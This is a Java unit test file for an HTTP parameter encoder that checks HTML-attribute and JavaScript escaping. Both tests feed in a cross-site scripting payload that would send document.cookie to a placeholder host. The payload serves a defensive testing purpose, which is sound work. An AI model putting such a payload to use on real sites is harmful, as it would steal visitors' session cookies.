package uk.gov.justice.services.adapter.rest.parameter;

import static org.hamcrest.CoreMatchers.is;
import static org.hamcrest.MatcherAssert.assertThat;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.junit.jupiter.MockitoExtension;

@ExtendWith(MockitoExtension.class)
public class HttpParameterEncoderTest {

    @InjectMocks
    private HttpParameterEncoder httpParameterEncoder;

    @Test
    public void shouldEncodeForHtmlAttribute() throws Exception {

        final String evilParameter = """
                <script> new Image().src="http://19.2.168.23.45/bogus.php?output=document.cookie:</script>"
                """;

        final String encodedParameter = """
                &lt;script> new Image().src=&#34;http://19.2.168.23.45/bogus.php?output=document.cookie:&lt;/script>&#34;\n""";

        assertThat(httpParameterEncoder.encodeForHtmlAttribute(evilParameter), is(encodedParameter));
    }

    @Test
    public void shouldEncodeForJavascript() throws Exception {

        final String evilParameter = """
                <script> new Image().src="http://19.2.168.23.45/bogus.php?output=document.cookie:</script>"
                """;

        final String encodedParameter = """
                <script> new Image().src=\\x22http:\\/\\/19.2.168.23.45\\/bogus.php?output=document.cookie:<\\/script>\\x22\\n""";

        assertThat(httpParameterEncoder.encodeForJavaScript(evilParameter), is(encodedParameter));
    }
}